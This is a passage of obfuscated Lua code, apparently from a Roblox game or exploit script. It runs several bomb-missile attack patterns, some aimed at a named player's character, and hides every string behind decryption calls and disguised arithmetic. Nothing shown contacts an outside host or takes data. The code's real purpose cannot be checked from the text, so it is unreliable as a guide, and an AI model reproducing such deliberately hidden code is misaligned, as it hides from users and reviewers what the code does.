"\88\92\159\131\164\188\195")]=path_b['BombMissile']['Body']};
												v255 = 1 - 0;
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\162\33\176\70\151\216\205\129\57\177", "\189\224\78\223\43\183\139")) then
										local v268 = 0 - 0;
										local v269;
										local v270;
										while true do
											if (v268 == (1660 - (256 + 1402))) then
												Destroy_Bomb();
												break;
											end
											if (v268 == (1900 - (30 + 1869))) then
												v270 = Vector3.new(1369 - (213 + 1156), 190 - (96 + 92), 0 + 0);
												Realse_Bomb(v269, v270);
												v268 = 901 - (142 + 757);
											end
											if (v268 == (0 + 0)) then
												SpawnBomb();
												v269 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\28\253\142\31\212\61", "\161\78\156\234\118")]=Radius,[LUAOBFUSACTOR_DECRYPT_STR_0("\147\174\217\217", "\188\199\215\169")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\223\6\83\116\250", "\136\156\105\63\27")]=Color,[LUAOBFUSACTOR_DECRYPT_STR_0("\47\133\116\49\55\137\119\51\15\132", "\84\123\236\25")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\216\130\190\21\163\173", "\213\144\235\202\119\204")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\6\0\206\38\39\39\72\48\58\199\12\33\49\72", "\45\67\120\190\74\72\67")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\13\35\245\131\246\154\237\236\16\39\255\150\237\157\234\218\49\55\236\183\252\140", "\137\64\66\141\197\153\232\142")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\39\213\49\178\154\12\201\49\139\135\7\213\46", "\232\99\176\66\198")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\193\46\44\3\119", "\76\140\65\72\102\27\237\153")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\111\194\6\222\216\5\187\89\248\15\226\216\8\176\94\195", "\222\42\186\118\178\183\97")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\116\225\84\139\94\248\119\154\88\233\64", "\234\61\140\36")]=(94 + 134),[LUAOBFUSACTOR_DECRYPT_STR_0("\17\210\169\123\27\40\210\180\66\14\51\201", "\111\65\189\218\18")]=path_b['BombMissile']['Body']};
												v268 = 80 - (32 + 47);
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\115\71\26\44\14\78\239\119\74\18\57", "\207\35\43\123\85\107\60")) then
										local v280 = 1977 - (1053 + 924);
										local v281;
										while true do
											if (v280 == (1 + 0)) then
												for v303 = 0 - 0, TimeLength * (1668 - (685 + 963)) do
													local v304 = 0 - 0;
													local v305;
													while true do
														if (v304 == (1 - 0)) then
															Realse_Bomb(v281, v305);
															wait(1709.05 - (541 + 1168));
															break;
														end
														if ((1597 - (645 + 952)) == v304) then
															v281[LUAOBFUSACTOR_DECRYPT_STR_0("\83\165\172\229\107", "\25\16\202\192\138")] = Color3.fromRGB(math.random(838 - (669 + 169), 883 - 628), math.random(0 - 0, 87 + 168), math.random(0 + 0, 1020 - (181 + 584)));
															v305 = game['Players'][player_tail]['Character']:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\201\196\191\241\166", "\148\157\171\205\130\201"), 1396 - (665 + 730))['Position'];
															v304 = 2 - 1;
														end
													end
												end
												Destroy_Bomb();
												break;
											end
											if (v280 == (0 - 0)) then
												SpawnBomb();
												v281 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\17\213\112\32\196\229", "\150\67\180\20\73\177")]=(1352 - (540 + 810)),[LUAOBFUSACTOR_DECRYPT_STR_0("\185\1\10\72", "\45\237\120\122")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\244\231\174\35\197", "\76\183\136\194")]=Color,[LUAOBFUSACTOR_DECRYPT_STR_0("\78\239\232\61\124\74\26\125\242\237", "\116\26\134\133\88\48\47")]=(3 - 2),[LUAOBFUSACTOR_DECRYPT_STR_0("\54\200\180\230\178\106", "\18\126\161\192\132\221")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\122\48\190\8\89\91\45\189\38\79\121\33\188\1", "\54\63\72\206\100")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\229\88\93\92\234\105\203\92\117\127\247\72\220\76\65\73\244\110\201\75\64\126", "\27\168\57\37\26\133")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\9\175\111\188\197\34\179\111\133\216\41\175\112", "\183\77\202\28\200")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\58\60\141\13\27", "\104\119\83\233")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\208\224\55\46\76\241\253\52\0\90\197\247\46\44\87\236", "\35\149\152\71\66")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\48\229\82\177\57\13\219\82\181\63\29", "\90\121\136\34\208")]=(182 + 46),[LUAOBFUSACTOR_DECRYPT_STR_0("\247\1\70\23\211\7\90\16\247\15\71\10", "\126\167\110\53")]=path_b['BombMissile']['Body']};
												v280 = 204 - (166 + 37);
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\108\69\54\184\254\48\50\29", "\95\93\112\78\152\188")) then
										local v295 = 1881 - (22 + 1859);
										local v296;
										local v297;
										while true do
											if (v295 == (1772 - (843 + 929))) then
												SpawnBomb();
												v296 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\243\244\129\28\241\173", "\178\161\149\229\117\132\222")]=Radius,[LUAOBFUSACTOR_DECRYPT_STR_0("\188\194\205\169", "\67\232\187\189\204\193\118\198")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\168\33\185\47\41", "\143\235\78\213\64\91\98")]=Color,[LUAOBFUSACTOR_DECRYPT_STR_0("\185\65\137\236\92\179\131\79\144\225", "\214\237\40\228\137\16")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\173\234\251\219\12\190", "\198\229\131\143\185\99")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\116\148\184\127\94\136\173\96\115\149\142\122\67\137", "\19\49\236\200")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\211\54\238\145\235\168\253\50\198\178\246\137\234\34\242\132\245\175\255\37\243\179", "\218\158\87\150\215\132")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\223\27\202\246\36\45\212\232\51\214\230\51\46", "\173\155\126\185\130\86\66")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\200\169\190\194\132", "\140\133\198\218\167\232")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\144\54\164\113\139\177\43\167\95\157\133\33\189\115\144\172", "\228\213\78\212\29")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\174\65\166\4\232\147\127\166\0\238\131", "\139\231\44\214\101")]=(490 - (30 + 232)),[LUAOBFUSACTOR_DECRYPT_STR_0("\233\224\21\87\4\184\62\24\233\238\20\74", "\118\185\143\102\62\112\209\81")]=path_b['BombMissile']['Body']};
												v295 = 2 - 1;
											end
											if (v295 == (779 - (55 + 722))) then
												Destroy_Bomb();
												break;
											end
											if (v295 == (1 - 0)) then
												v297 = Vector3.new(1675 - (78 + 1597), 1 + 1, 0 + 0);
												for v322 = 0 + 0, 564 - (305 + 244) do
													local v323 = 0 + 0;
													while true do
														if (v323 == (105 - (95 + 10))) then
															Realse_Bomb(v296, v297);
															wait(0.02 + 0);
															break;
														end
													end
												end
												v295 = 6 - 4;
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\114\101\42\234\160\20\14\120\126\127\36\228", "\88\60\16\73\134\197\117\124")) then
										local v306 = 0 - 0;
										local v307;
										local v308;
										local v309;
										local v310;
										while true do
											if (v306 == (762 - (592 + 170))) then
												SpawnBomb();
												v307 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\98\235\252\193\84\67", "\33\48\138\152\168")]=(195 - 139),[LUAOBFUSACTOR_DECRYPT_STR_0("\70\15\32\84", "\87\18\118\80\49\161")]=LUAOBFUSACTOR_DECRYPT_STR_0("\101\19\202\172\191\72\27", "\208\44\126\186\192"),[LUAOBFUSACTOR_DECRYPT_STR_0("\212\21\168\201\6", "\46\151\122\196\166\116\156\169")]=Color3.fromRGB(0 - 0, 0 + 0, 0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\209\228\75\31\215\224\227\65\14\243", "\155\133\141\38\122")]=(6 - 3),[LUAOBFUSACTOR_DECRYPT_STR_0("\13\35\184\67\64\103", "\197\69\74\204\33\47\31")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\213\87\74\139\255\75\95\148\210\86\124\142\226\74", "\231\144\47\58")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\159\217\194\83\23\47\204\60\130\221\200\70\12\40\203\10\163\205\219\103\29\57", "\89\210\184\186\21\120\93\175")]=-(25 + 125),[LUAOBFUSACTOR_DECRYPT_STR_0("\149\86\111\193\107\53\168\64\81\218\125\63\189", "\90\209\51\28\181\25")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\253\116\83\235\179", "\223\176\27\55\142")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\1\163\222\185\43\191\203\166\6\162\254\186\45\181\218\172", "\213\68\219\174")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\34\237\51\230\41\209\12\111\14\229\39", "\31\107\128\67\135\74\165\95")]=(422 - 194),[LUAOBFUSACTOR_DECRYPT_STR_0("\232\231\239\68\85\184\215\230\204\76\83\165", "\209\184\136\156\45\33")]=path_b['BombMissile']['Body']};
												v308 = Vector3.new(507 - (353 + 154), 86 - 21, 0 - 0);
												v306 = 1 + 0;
											end
											if (v306 == (1 + 0)) then
												Realse_Bomb(v307, v308);
												Realse_Bomb(v307, v308);
												v309 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\53\201\113\1\173\20", "\216\103\168\21\104")]=(38 + 19),[LUAOBFUSACTOR_DECRYPT_STR_0("\76\180\83\161", "\196\24\205\35")]=LUAOBFUSACTOR_DECRYPT_STR_0("\7\134\243\10\33\143\230", "\102\78\235\131"),[LUAOBFUSACTOR_DECRYPT_STR_0("\217\33\56\75\85", "\84\154\78\84\36\39\89\215")]=Color3.fromRGB(368 - 113, 482 - 227, 594 - 339),[LUAOBFUSACTOR_DECRYPT_STR_0("\201\232\91\93\41\248\239\81\76\13", "\101\157\129\54\56")]=(89 - (7 + 79)),[LUAOBFUSACTOR_DECRYPT_STR_0("\53\160\158\169\44\97", "\25\125\201\234\203\67")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\92\236\8\15\27\35\22\106\214\1\37\29\53\22", "\115\25\148\120\99\116\71")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\33\60\161\2\78\30\62\188\20\68\30\14\173\49\69\63\44\172\37\83\9\57", "\33\108\93\217\68")]=-(71 + 79),[LUAOBFUSACTOR_DECRYPT_STR_0("\255\78\178\185\201\68\184\190\246\68\165\168\215", "\205\187\43\193")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\211\125\1\218\242", "\191\158\18\101")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\224\219\151\187\160\193\198\148\149\182\245\204\142\185\187\220", "\207\165\163\231\215")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\239\244\233\87\39\100\245\233\252\83\32", "\16\166\153\153\54\68")]=(409 - (24 + 157)),[LUAOBFUSACTOR_DECRYPT_STR_0("\226\188\211\79\32\40\246\220\131\193\84\32", "\153\178\211\160\38\84\65")]=path_b['BombMissile']['Body']};
												v306 = 3 - 1;
											end
											if (v306 == (6 - 3)) then
												v307 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\176\10\94\34\151\24", "\75\226\107\58")]=Radius,[LUAOBFUSACTOR_DECRYPT_STR_0("\108\215\28\127\61\199\195\95\202\25", "\173\56\190\113\26\113\162")]=(1 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\227\215\57\7\248\211", "\151\171\190\77\101")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\224\55\232\165\247\121\14\214\13\225\143\241\111\14", "\107\165\79\152\201\152\29")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\122\79\240\237\91\109\84\75\216\206\70\76\67\91\236\248\69\106\86\92\237\207", "\31\55\46\136\171\52")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\245\45\207\224\195\39\197\231\252\39\216\241\221", "\148\177\72\188")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\139\185\83\214\170", "\179\198\214\55")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\213\20\98\122\74\215\245\31\80\111\117\220\249\2\102\111", "\179\144\108\18\22\37")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\239\174\11\136\204\210\144\11\140\202\194", "\175\166\195\123\233")]=(614 - 386),[LUAOBFUSACTOR_DECRYPT_STR_0("\223\205\78\64\228\230\205\83\121\241\253\214", "\144\143\162\61\41")]=path_b['BombMissile']['Body']};
												v308 = Vector3.new(380 - (262 + 118), 1085 - (1038 + 45), 0 - 0);
												Realse_Bomb(v307, v308);
												v306 = 234 - (19 + 211);
											end
											if (v306 == (117 - (88 + 25))) then
												v308 = Vector3.new(0 - 0, 33 + 32, 0 + 0);
												for v336 = 1036 - (1007 + 29), 2 + 3 do
													local v337 = 0 - 0;
													local v338;
													while true do
														if (v337 == (9 - 7)) then
															v338 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\210\210\25\89\103\148", "\83\128\179\125\48\18\231")]=(13 + 43),[LUAOBFUSACTOR_DECRYPT_STR_0("\105\174\227\216", "\126\61\215\147\189\39")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\91\240\17\74\106", "\37\24\159\125")]=Color3.fromRGB(1011 - (340 + 471), 503 - 303, 789 - (276 + 313)),[LUAOBFUSACTOR_DECRYPT_STR_0("\238\175\120\71\246\163\123\69\206\174", "\34\186\198\21")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\208\1\209\95\205\224", "\162\152\104\165\61")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\232\55\162\113\127\225\200\60\144\100\86\236\223\42", "\133\173\79\210\29\16")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\160\125\245\13\130\110\238\46\189\121\255\24\153\105\233\24\156\105\236\57\136\120", "\75\237\28\141")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\248\90\223\165\61\20\254\242\241\80\200\180\35", "\129\188\63\172\209\79\123\135")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\109\235\226\200\76", "\173\32\132\134")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\107\3\24\227\161\53\200\93\57\17\223\161\56\195\90\2", "\173\46\123\104\143\206\81")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\157\16\50\139\70\151\50\164\24\39\142", "\97\212\125\66\234\37\227")]=(556 - 328),[LUAOBFUSACTOR_DECRYPT_STR_0("\186\236\165\60\10\131\236\184\5\31\152\247", "\126\234\131\214\85")]=path_b['BombMissile']['Body']};
															Realse_Bomb(v338, v308);
															break;
														end
														if (v337 == (1 + 0)) then
															v338 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\182\212\77\83\90\151", "\47\228\181\41\58")]=(24 + 32),[LUAOBFUSACTOR_DECRYPT_STR_0("\146\229\201\62", "\127\198\156\185\91\99\80")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\214\21\192\255\181", "\190\149\122\172\144\199\107\89")]=Color3.fromRGB(24 + 231, 2197 - (495 + 1477), 0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\6\12\252\251\210\55\11\246\234\246", "\158\82\101\145\158")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\88\247\22\20\75\104", "\36\16\158\98\118")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\229\14\211\247\87\236\34\246\226\15\229\242\74\237", "\133\160\118\163\155\56\136\71")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\219\163\105\212\185\13\182\243\146\116\224\133\11\160\242\145\96\231\183\13\176\242", "\213\150\194\17\146\214\127")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\63\172\183\192\84\171\187\37\54\166\160\209\74", "\86\123\201\196\180\38\196\194")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\218\231\221\170\251", "\207\151\136\185")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\141\155\56\142\123\124\116\187\161\49\178\123\113\127\188\154", "\17\200\227\72\226\20\24")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\153\76\11\214\202\229\220\239\181\68\31", "\159\208\33\123\183\169\145\143")]=(150 + 78),[LUAOBFUSACTOR_DECRYPT_STR_0("\194\85\43\63\230\83\55\56\194\91\42\34", "\86\146\58\88")]=path_b['BombMissile']['Body']};
															Realse_Bomb(v338, v308);
															v337 = 405 - (342 + 61);
														end
														if (v337 == (0 + 0)) then
															v338 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\106\222\238\201\187\250", "\154\56\191\138\160\206\137\86")]=(221 - (4 + 161)),[LUAOBFUSACTOR_DECRYPT_STR_0("\178\64\229\130", "\172\230\57\149\231\28\90\225")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\33\165\138\221\58", "\187\98\202\230\178\72")]=Color3.fromRGB(123 + 77, 627 - 427, 525 - 325),[LUAOBFUSACTOR_DECRYPT_STR_0("\21\232\169\53\102\36\239\163\36\66", "\42\65\129\196\80")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\42\67\73\216\24\31", "\142\98\42\61\186\119\103\98")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\29\167\18\4\55\187\7\27\26\166\36\1\42\186", "\104\88\223\98")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\105\246\250\232\13\255\71\242\210\203\16\222\80\226\230\253\19\248\69\229\231\202", "\141\36\151\130\174\98")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\160\127\209\25\150\117\219\30\169\117\198\8\136", "\109\228\26\162")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\115\234\249\125\236", "\134\62\133\157\24\128")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\34\189\10\213\32\181\211\20\135\3\233\32\184\216\19\188", "\182\103\197\122\185\79\209")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\218\138\241\118\3\92\192\151\228\114\4", "\40\147\231\129\23\96")]=(725 - (322 + 175)),[LUAOBFUSACTOR_DECRYPT_STR_0("\69\247\159\76\175\165\211\123\200\141\87\175", "\188\21\152\236\37\219\204")]=path_b['BombMissile']['Body']};
															Realse_Bomb(v338, v308);
															v337 = 564 - (173 + 390);
														end
													end
												end
												Destroy_Bomb();
												break;
											end
											if (v306 == (1 + 1)) then
												v310 = Vector3.new(314 - (203 + 111), 5 + 60, 0 + 0);
												Realse_Bomb(v309, v310);
												wait(5 - 3);
												v306 = 3 + 0;
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\98\229\54\15\75\169\31\3\76\236", "\108\32\137\87")) then
										local v324 = 706 - (57 + 649);
										local v325;
										local v326;
										while true do
											if (v324 == (384 - (328 + 56))) then
												SpawnBomb();
												v325 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\152\233\4\175\58\234", "\57\202\136\96\198\79\153\43")]=(13 + 27),[LUAOBFUSACTOR_DECRYPT_STR_0("\136\44\166\168\159", "\152\203\67\202\199\237\199")]=Color3.fromRGB(512 - (433 + 79), 1 + 0, 0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\206\90\176\10", "\134\154\35\192\111\127\21\25")]=LUAOBFUSACTOR_DECRYPT_STR_0("\145\43\25\6\47\214\189", "\178\216\70\105\106\64"),[LUAOBFUSACTOR_DECRYPT_STR_0("\11\34\119\243\229\208\218\135\43\35", "\224\95\75\26\150\169\181\180")]=(TimeLength * (3.5 - 2)),[LUAOBFUSACTOR_DECRYPT_STR_0("\35\211\204\42\75\180", "\22\107\186\184\72\36\204")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\194\165\52\66\1\227\184\55\108\23\193\180\54\75", "\110\135\221\68\46")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\206\55\20\205\193\161\56\230\6\9\249\253\167\46\231\5\29\254\207\161\62\231", "\91\131\86\108\139\174\211")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\223\46\171\3\79\244\50\171\58\82\255\46\180", "\61\155\75\216\119")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\41\164\182\57\84", "\189\100\203\210\92\56\105")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\10\73\237\36\32\85\248\59\13\72\205\39\38\95\233\49", "\72\79\49\157")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\161\189\33\189\139\164\2\172\141\181\53", "\220\232\208\81")]=(0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\197\177\246\57\56\83\174\251\142\228\34\56", "\193\149\222\133\80\76\58")]=path_b['BombMissile']['Body']};
												v326 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\244\92\75\219\211\78", "\178\166\61\47")]=Radius,[LUAOBFUSACTOR_DECRYPT_STR_0("\216\69\228\117\216", "\94\155\42\136\26\170")]=Color3.fromRGB(0 + 0, 1036 - (562 + 474), 0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\176\38\54\176", "\213\228\95\70")]=LUAOBFUSACTOR_DECRYPT_STR_0("\25\181\205\147\71\37\180\196", "\23\74\219\162\228"),[LUAOBFUSACTOR_DECRYPT_STR_0("\13\239\75\170\23\60\232\65\187\51", "\91\89\134\38\207")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\108\231\220\52\28\200", "\71\36\142\168\86\115\176")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\250\185\98\179\12\186\83\90\253\184\84\182\17\187", "\41\191\193\18\223\99\222\54")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\134\39\223\12\165\185\37\194\26\175\185\21\211\63\174\152\55\210\43\184\174\34", "\202\203\70\167\74")]=-(980 - (76 + 829)),[LUAOBFUSACTOR_DECRYPT_STR_0("\8\4\207\39\99\35\24\207\30\126\40\4\208", "\17\76\97\188\83")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\168\40\221\50\60", "\195\229\71\185\87\80\227\43")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\197\228\16\92\224\228\249\19\114\246\208\243\9\94\251\249", "\143\128\156\96\48")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\145\220\224\19\20\172\226\224\23\18\188", "\119\216\177\144\114")]=(1678 - (1506 + 167)),[LUAOBFUSACTOR_DECRYPT_STR_0("\249\38\234\75\221\32\246\76\249\40\235\86", "\34\169\73\153")]=path_b['BombMissile']['Body']};
												for v347 = 0 - 0, 291 - (58 + 208) do
													Realse_Bomb(v325, Vector3.new(0 + 0, 125 + 50, 0 + 0));
												end
												v324 = 3 - 2;
											end
											if (v324 == (338 - (258 + 79))) then
												for v348 = 0 + 0, TimeLength * (8 - 4) do
													local v349 = 1470 - (1219 + 251);
													while true do
														if ((1671 - (1231 + 440)) == v349) then
															Realse_Bomb(v326, Vector3.new(58 - (34 + 24), 102 + 73, 0 - 0));
															wait(0.25 + 0);
															break;
														end
													end
												end
												v326[LUAOBFUSACTOR_DECRYPT_STR_0("\135\237\19\173\165\254\8\142\154\233\25\184\190\249\15\184\187\249\10\153\175\232", "\235\202\140\107")] = 30372 - 20372;
												v325[LUAOBFUSACTOR_DECRYPT_STR_0("\56\109\36\173", "\165\108\20\84\200\137\71\151")] = LUAOBFUSACTOR_DECRYPT_STR_0("\88\181\39\132\117\187\37\184\117\164", "\232\26\212\75");
												v325[LUAOBFUSACTOR_DECRYPT_STR_0("\3\64\127\237\219\50\71\117\252\255", "\151\87\41\18\136")] = 3 - 2;
												v324 = 5 - 3;
											end
											if (v324 == (6 - 4)) then
												for v350 = 0 - 0, 1594 - (877 + 712) do
													local v351 = 0 + 0;
													while true do
														if (v351 == (754 - (242 + 512))) then
															Realse_Bomb(v325, Vector3.new(0 - 0, 802 - (92 + 535), 0 + 0));
															wait();
															break;
														end
													end
												end
												Realse_Bomb(v326, Vector3.new(0 - 0, 11 + 164, 0 - 0));
												Destroy_Bomb();
												break;
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\97\166\205\209", "\158\59\207\170\176")) then
										local v339 = 0 + 0;
										local v340;
										while true do
											if (v339 == (1 + 0)) then
												Realse_Bomb(v340, Vector3.new(0 + 0, 498 - 248, 0 - 0));
												for v357 = 1785 - (1476 + 309), 1334 - (299 + 985) do
													local v358 = 0 + 0;
													while true do
														if (v358 == (0 - 0)) then
															Realse_Bomb(v340, Vector3.new(v357, 343 - (86 + 7), 0 - 0));
															Realse_Bomb(v340, Vector3.new(-v357, 24 + 226, 880 - (672 + 208)));
															v358 = 1 + 0;
														end
														if (v358 == (133 - (14 + 118))) then
															Realse_Bomb(v340, Vector3.new(v357, 695 - (339 + 106), -(40 + 10)));
															Realse_Bomb(v340, Vector3.new(-v357, 126 + 124, 1445 - (440 + 955)));
															break;
														end
													end
												end
												v339 = 2 + 0;
											end
											if (v339 == (0 - 0)) then
												SpawnBomb();
												v340 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\125\95\55\64\153\92", "\236\47\62\83\41")]=(2 + 3),[LUAOBFUSACTOR_DECRYPT_STR_0("\217\166\44\52\184", "\226\154\201\64\91\202")]=Color,[LUAOBFUSACTOR_DECRYPT_STR_0("\245\80\13\29", "\220\161\41\125\120\42")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\136\120\173\11\144\116\174\9\168\121", "\110\220\17\192")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\92\112\32\24\228\47", "\199\20\25\84\122\139\87\145")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\98\17\205\162\20\238\66\26\255\183\61\227\85\12", "\138\39\105\189\206\123")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\50\6\145\11\252\235\204\250\47\2\155\30\231\236\203\204\14\18\136\63\246\253", "\159\127\103\233\77\147\153\175")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\35\245\247\190\82\196\30\227\201\165\68\206\11", "\171\103\144\132\202\32")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\61\32\237\9\28", "\108\112\79\137")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\26\218\100\36\162\5\236\38\29\219\68\39\164\15\253\44", "\85\95\162\20\72\205\97\137")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\222\240\58\221\14\236\254\231\248\47\216", "\173\151\157\74\188\109\152")]=(0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\20\7\43\212\200\93\218\253\20\9\42\201", "\147\68\104\88\189\188\52\181")]=path_b['BombMissile']['Body']};
												v339 = 354 - (260 + 93);
											end
											if ((2 + 0) == v339) then
												for v359 = 0 - 0, 90 - 40 do
													local v360 = 1974 - (1181 + 793);
													while true do
														if (v360 == (0 + 0)) then
															Realse_Bomb(v340, Vector3.new(307 - (105 + 202), 201 + 49, v359));
															Realse_Bomb(v340, Vector3.new(810 - (352 + 458), 1007 - 757, -v359));
															v360 = 2 - 1;
														end
														if ((1 + 0) == v360) then
															Realse_Bomb(v340, Vector3.new(146 - 96, 1199 - (438 + 511), v359));
															Realse_Bomb(v340, Vector3.new(-(1433 - (1262 + 121)), 1318 - (728 + 340), -v359));
															break;
														end
													end
												end
												Destroy_Bomb();
												break;
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\40\137\130\222\24\135\156", "\176\122\232\235")) then
										local v352 = 1790 - (816 + 974);
										local v353;
										while true do
											if (v352 == (0 - 0)) then
												SpawnBomb();
												v353 = Vector3.new(0 - 0, 539 - (163 + 176), 0 - 0);
												v352 = 4 - 3;
											end
											if (v352 == (1 + 0)) then
												for v365 = 1810 - (1564 + 246), 495 - (124 + 221) do
													local v366 = 0 + 0;
													local v367;
													while true do
														if (v366 == (451 - (115 + 336))) then
